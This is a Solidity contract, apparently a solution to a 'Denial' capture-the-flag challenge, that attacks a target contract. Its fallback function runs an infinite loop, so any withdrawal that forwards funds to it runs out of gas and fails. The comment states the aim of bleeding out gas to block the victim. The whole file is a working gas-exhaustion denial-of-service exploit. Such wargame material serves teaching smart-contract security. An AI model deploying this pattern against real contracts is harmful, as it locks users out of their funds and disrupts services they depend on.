// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Denial.sol";
import "hardhat/console.sol";

contract AttackingDenial {
    address payable public contractAddress;

    constructor(address payable _contractAddress) {
        contractAddress = _contractAddress;
    }

    // Goal: bleed out the gas fees . Even though victim will get to 
    // call `withdraw`, it will fail due to lack of gas
    fallback() external payable {
        while(true) {
        }
    }
}
